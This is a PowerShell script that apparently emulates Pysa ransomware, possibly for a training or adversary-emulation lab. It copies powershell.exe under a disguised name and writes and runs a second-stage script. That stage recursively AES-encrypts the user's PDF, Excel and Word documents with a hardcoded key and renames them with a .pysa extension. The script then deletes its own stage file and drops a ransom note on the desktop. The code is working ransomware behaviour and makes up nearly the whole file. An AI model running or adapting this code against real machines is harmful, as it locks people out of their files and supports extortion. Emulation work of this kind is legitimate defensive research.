# Function to verify the creation of files
function testFor(){
    If ( Test-Path $out ){
        Write-Host -BackgroundColor "Green" -ForegroundColor "White" "File was copied"
        return $true
    } Else {
        Write-Host -BackgroundColor "Red" -ForegroundColor "White" "File was not created"
        return $false
    }
}

$step2 = @'
<#
Source for below:
https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps2
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".pysa"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# List Files in a Directory
# List all Files and print full path
#Get-ChildItem -Recurse  -include *.pdf,*.xlsx,*.docx -Path .\Documents | select fullname

# List all files, dump to csv, read in and encrypt said files
function Emulate-Pysa {
    #Export to csv
    Get-ChildItem -Recurse  -include *.pdf,*.xlsx,*.docx -Path .\Documents | export-csv `
    -Path files.csv

    # Import CSV file.
    $fileList = import-csv -path .\files.csv -header FullName

    #Loop through results
    foreach ($f in $fileList) {

        #Encrypt each file
        Invoke-AESEncryption -Mode Encrypt -Key "apple" -Path $f.FullName
        #Get-ChildItem -Path $f.FullName

    }
}

Emulate-Pysa

# Remove File
Invoke-Expression "C:\Users\dove\Documents\update.bat"
'@

$updatebat = @'
del C:\Users\dove\Documents\step2.ps1
'@

# Copy Powershell to the user dove's directory
$out = "C:\Users\dove\EnNoB-8213.exe"
Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $out
testFor($out) | out-null

# Build Step 2
write-output $step2 | out-file -file "C:\Users\dove\Documents\step2.ps1"
# Build the deletion bat script
write-output $updatebat | out-file -file ".\update.bat"

If ( testFor("C:\Users\dove\Documents\step2.ps1" | out-null ) ) {
    Invoke-Expression "C:\Users\dove\Documents\step2.ps1"

}

# Write the ransom note to the users desktop
$out = "C:\Users\dove\Desktop\Readme.READ"
Write-Output "If you want your files restored , please contact me at dunston@champlain.edu. I look forward to doing business with you." | out-file -file $out
testFor($out) | out-null